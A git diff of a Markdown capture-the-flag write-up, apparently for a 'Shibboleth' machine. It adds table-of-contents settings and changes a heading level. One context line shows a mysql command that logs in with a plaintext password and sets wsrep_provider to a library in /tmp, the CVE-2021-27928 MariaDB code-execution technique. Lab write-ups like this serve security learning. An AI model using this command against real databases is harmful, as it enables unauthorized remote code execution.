@@ -22,6 +22,8 @@ tag:
     - MariaDB
     - RCE
     - CVE-2021-27928
+toc: true
+toc_sticky: true
 ---
 
 ![](/assets/img/shibolleth/cover.png)
@@ -221,7 +223,7 @@ mysql -u zabbix -pbloooarskybluh -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27
 
 ![](/assets/img/shibolleth/16.png)
 
-### REFERENCESS
+## REFERENCESS
 ```text
 https://book.hacktricks.xyz/network-services-pentesting/623-udp-ipmi
 http://g2pc1.bu.edu/~qzpeng/manual/MySQL%20Commands.htm
